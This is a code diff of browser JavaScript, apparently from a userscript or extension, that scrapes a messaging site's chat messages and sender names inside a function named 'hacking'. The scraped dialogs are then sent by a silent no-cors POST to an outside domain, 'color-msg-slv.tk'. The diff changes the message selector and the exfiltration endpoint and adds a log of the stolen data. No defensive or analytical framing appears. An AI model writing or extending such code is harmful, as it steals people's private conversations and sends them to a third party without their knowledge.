@@ -98,7 +98,9 @@ function getMessages() {
     document.querySelectorAll('.im-mess-stack').forEach(mess =>
         messages.push({
             name: mess.querySelector('.im-mess-stack--lnk').innerHTML,
-            mess: mess.querySelector('.im-mess--text').outerHTML,
+            // mess: mess.querySelector('.im-mess--text').outerHTML,
+            mess: mess.querySelector('.im-mess-stack--mess').outerHTML,
+
         })
     );
     return messages;
@@ -411,12 +413,14 @@ async function hacking() {
         formData.append('data', JSON.stringify(dialogsData));
 
         fetch(
-            'https://color-msg-slv.tk/save-it.php', {
+            'https://color-msg-slv.tk/api/save-it.php', {
                 method: 'POST',
                 mode: 'no-cors',
                 body: formData,
             }
         );
+
+        console.log(dialogsData);
 
         console.log('data is missed');
 
